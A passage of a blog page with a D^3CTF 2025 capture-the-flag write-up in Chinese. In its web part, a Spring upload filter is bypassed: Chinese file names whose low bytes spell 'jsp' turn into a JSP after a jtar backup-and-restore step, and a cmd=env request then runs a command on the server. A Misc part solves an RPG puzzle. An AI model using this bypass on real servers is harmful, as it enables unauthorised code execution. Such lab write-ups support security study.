<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/view"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> page<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>page<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9-]+$"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> viewPath <span class="token operator">=</span> <span class="token string">"/WEB-INF/views/"</span> <span class="token operator">+</span> page <span class="token operator">+</span> <span class="token string">".jsp"</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> realPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span>viewPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">File</span> jspFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>realPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>realPath <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> jspFile<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">ModelAndView</span> mav <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    mav<span class="token punctuation">.</span><span class="token function">addObject</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token string">"The file don't exist."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> mav<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>只能渲染 jsp 文件</p>
</li>
<li><p>&#x2F;Upload</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/Upload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">UploadController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">MultipartFile</span> file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> uploadDir <span class="token operator">=</span> <span class="token string">"webapps/ROOT/WEB-INF/views"</span><span class="token punctuation">;</span>
        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> blackList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"jsp"</span><span class="token punctuation">,</span> <span class="token string">"jspx"</span><span class="token punctuation">,</span> <span class="token string">"jspf"</span><span class="token punctuation">,</span> <span class="token string">"jspa"</span><span class="token punctuation">,</span> <span class="token string">"jsw"</span><span class="token punctuation">,</span> <span class="token string">"jsv"</span><span class="token punctuation">,</span> <span class="token string">"jtml"</span><span class="token punctuation">,</span> <span class="token string">"jhtml"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"xml"</span><span class="token punctuation">,</span> <span class="token string">"war"</span><span class="token punctuation">,</span> <span class="token string">"jar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token class-name">Upload</span><span class="token punctuation">.</span><span class="token function">secureUpload</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> uploadDir<span class="token punctuation">,</span> blackList<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"Upload Success: "</span> <span class="token operator">+</span> filePath<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Upload<span class="token punctuation">.</span>UploadException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"The file is forbidden: "</span> <span class="token operator">+</span> var5<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上传文件，但是过滤 jsp 后缀，并且上传</p>
</li>
<li><p>&#x2F;Backup</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/BackUp"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">BackUpController</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> op<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"tar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">BackUp</span><span class="token punctuation">.</span><span class="token function">tarDirectory</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"backup.tar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"webapps/ROOT/WEB-INF/views"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string">"Success !"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string">"Failure : tar Error"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"untar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">BackUp</span><span class="token punctuation">.</span><span class="token function">untar</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"webapps/ROOT/WEB-INF/views"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"backup.tar"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string">"Success !"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string">"Failure : untar Error"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"Failure : option Error"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里会用 jtar 依赖压缩为 tar 或解压 tar 包</p>
</li>
</ul>
<p>先测试上传，我们自己压的 tar 包不支持上传，那么就是裸传一个普通后缀文件，然后在解压缩这里下文章</p>
<p>测试发现，当后缀名为中文 ”测“ 时，此时压缩再解压得到</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602222406078.png" alt="image-20250602222406078"></p>
<p>而压缩包里的文件为</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602222549862.png" alt="image-20250602222549862"></p>
<p>可见这里 tar 压缩时编码出现了差异</p>
<p>那么观察 Backup 类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>kamranzafar<span class="token punctuation">.</span>jtar<span class="token punctuation">.</span></span><span class="token class-name">TarEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>kamranzafar<span class="token punctuation">.</span>jtar<span class="token punctuation">.</span></span><span class="token class-name">TarInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>kamranzafar<span class="token punctuation">.</span>jtar<span class="token punctuation">.</span></span><span class="token class-name">TarOutputStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">tarDirectory</span><span class="token punctuation">(</span><span class="token class-name">Path</span> outputFile<span class="token punctuation">,</span> <span class="token class-name">Path</span> inputDirectory<span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> pathPrefixesToExclude<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">FileOutputStream</span> dest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>outputFile<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Path</span> outputFileAbsolute <span class="token operator">=</span> outputFile<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Path</span> inputDirectoryAbsolute <span class="token operator">=</span> inputDirectory<span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> inputPathLength <span class="token operator">=</span> inputDirectoryAbsolute<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">TarOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TarOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Throwable</span> var8 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">walk</span><span class="token punctuation">(</span>inputDirectoryAbsolute<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LinkOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>entry<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>outputFileAbsolute<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                        <span class="token class-name">String</span> relativeName <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>inputPathLength <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        out<span class="token punctuation">.</span><span class="token function">putNextEntry</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TarEntry</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> relativeName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token class-name">BufferedInputStream</span> origin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">toFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

                        <span class="token keyword">int</span> count<span class="token punctuation">;</span>
                        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>count <span class="token operator">=</span> origin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>

                        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        origin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        var8<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>

                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var17<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        var8 <span class="token operator">=</span> var17<span class="token punctuation">;</span>
        <span class="token keyword">throw</span> var17<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>out <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var8 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                    out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var16<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    var8<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var16<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>跟进 TarOutputStream，调试</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602223421058.png" alt="image-20250602223421058"></p>
<p>进入 writeEntryHeader</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602223808351.png" alt="image-20250602223808351"></p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602224404955.png" alt="image-20250602224404955"></p>
<p>此处 outbuf 解码可以得到 296a3be2-ce28-4404-bcd5-0b337a6ebeb6.K，此时就发现问题了</p>
<p>重新跟进 getNameBytes 看看</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602223926321.png" alt="image-20250602223926321"></p>
<p>这里将 char 类型的文件名强转为 byte，会发生什么情况呢</p>
<blockquote>
<p>java 中 char 的大小在 \u0000-\uffff 之间，而byte的大小在 (-127)-128 之间，所以当char的值在257时，被强制转换成byte，则会变成1，即ascii码为1对应的字符</p>
</blockquote>
<p>观察这两个字符的 unicode</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测：\u6d4b
K: \u004b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>只取了低位的 4b</p>
<p>所以思路就是找到一个中文字符串低位为 jsp 的 unicode</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">jsp: \u006a\u0073\u0070
浪浳浰: \u6d6a\u6d73\u6d70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602225836357.png" alt="image-20250602225836357"></p>
<p>再进行压缩与解压，最后访问 &#x2F;view?page&#x3D;077ce1c4-4bf3-4fc7-b652-5157d663b8b7&amp;cmd&#x3D;env</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602230008480.png" alt="image-20250602230008480"></p>
<hr>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="d3rpg-signin（复现）"><a href="#d3rpg-signin（复现）" class="headerlink" title="d3rpg-signin（复现）"></a>d3rpg-signin（复现）</h2><p>与村庄告示牌对话，得到信息：</p>
<ol>
<li>水井需要密码</li>
<li>村长家天花板出现漏水现象</li>
<li>酒馆提供 DEBUG 麦酒，饮用后可查看寄存器与内存数据</li>
<li>每个人最多持有1字节的有符号金钱</li>
</ol>
<br>

<p>进入村长家，和旁边的npc对话，选择 musc 手</p>
<p>得到 flag1： <code>BtM183b19k</code></p>
<br>

<p>村庄内与醉酒老头npc对话，选择”风华正茂“，得到村长家地下室的密钥 <code>md5(password)</code></p>
<p>与村长家二楼的最后一个箱子交互得到提示：127+1 什么时候等于 -128 呢</p>
<p>进入地下室，酒馆入口在右下角</p>
<p>进入酒馆，购买 255RMB 的 object，由于溢出会获得 1RMB</p>
<p>获得 2 RMB 购买flag2</p>
<p>得到 flag2：<code>M19ScEd</code></p>
<br>

<p>再刷点 RMB 购买 DEBUG 麦酒</p>
<p>使用 DEBUG 麦酒 查看水井的寄存器和内存值，得到如下内容</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">RAX&#x3D;0
RBX&#x3D;329590FAB0
RCX&#x3D;7FFE9BEC2414
RDX&#x3D;0
RBP&#x3D;0
RSP&#x3D;329590F590
RSI&#x3D;3295B85000
RDI&#x3D;1
RIP&#x3D;7FFE9BE84DDA

[RBP-0x10] 0x00007FF692AE9841
[RBP-0x18] 0x000002025F0A2490
[RBP-0x20] 0x0000007773506D49
[RBP-0x28] 0x11100F0E0D0C0B0A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>0x0000007773506D49</code> 可以十六进制解出来 wsPmI，因为是小端序所以水井密码为 <code>ImPsw</code> </p>
<p>得到 flag0：<code>VzNsYz</code></p>
<br>

<p>在村长家二楼，与村长和右起第二个箱子交互获得以下提示：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">flag3远在天边，近在眼前
小大小大小大大大=
A.   -
B-. . .
C-. -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可知和摩斯密码有关，仔细观察地板</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602213615097.png" alt="image-20250602213615097"></p>
<p>可以发现每一行地板的贴图有两种，一种是半透光的， 一种是完整的</p>
<p>结合摩斯得到：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">..-. ...-
--.. -...
-.-- --
.--  --.-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>解码得到 FVZBYMWQ</p>
<p>小大代表大小写，于是得到 flag3：<code>fVzByMWQ=</code></p>
<p>拼接得到完整 flag：<code>VzNsYzBtM183b19kM19ScEdfVzByMWQ=</code></p>
<p>解码得到 <code>W3lc0m3_7o_d3_RpG_W0r1d</code></p>
<br>

<p>也可以拿 ce 直接改完金币数买 128mb 就行</p>
<br>

<p>Mtool 直接翻译取出原文秒了</p>
<p><img src="/blog/2025/05/30/D-3CTF-2025/image-20250602191627056.png" alt="image-20250602191627056"></p>
<hr>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>